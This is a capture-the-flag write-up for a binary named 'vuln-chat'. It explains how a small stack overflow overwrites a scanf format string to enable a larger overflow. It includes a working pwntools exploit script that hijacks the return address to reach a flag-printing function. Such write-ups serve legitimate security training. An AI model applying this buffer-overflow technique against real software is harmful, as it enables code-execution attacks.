# Application

![image](https://user-images.githubusercontent.com/115867891/206297958-7b675812-ec8a-4edf-aa59-4ef80ce0e9ac.png)

# Dissasembly

IDA shows 2 `scanf` calls, one for a name and one for some password. Now taking a look at the stack:

![image](https://user-images.githubusercontent.com/115867891/206298795-99c5fcd4-2ad8-4b1b-b524-32f80743adf0.png)

Both name and password accept 0x14 bytes. But we can write 30 due to `%30s` in `scanf`. However, we cannot reach return address with
either of them.

What we can do (thanks to the tutorial...), is overwrite the format string to `%99` and then it can accept any number of password chars.
We first overwrite 0x14 bytes, then our new format string. Then, overwrite 0x31 bytes and return address to the static address (since there is no PIE).

# Exploit

```
from pwn import *

elf = ELF('./vuln-chat')

addr_shell = elf.symbols['printFlag']
print(hex(addr_shell))

proc = process('./vuln-chat')

payload1 = b'A' * 0x14 + b"%99s"
print(proc.recvuntil("username: "))
proc.sendline(payload1)

payload2 = b'A' * 0x31 + p32(0x0804856B)
print(proc.recvuntil("I know I can trust you?"))
proc.sendline(payload2)

proc.interactive()
```

![image](https://user-images.githubusercontent.com/115867891/206299918-d70d4514-2cf2-4e10-a9aa-7b423653f5e8.png)
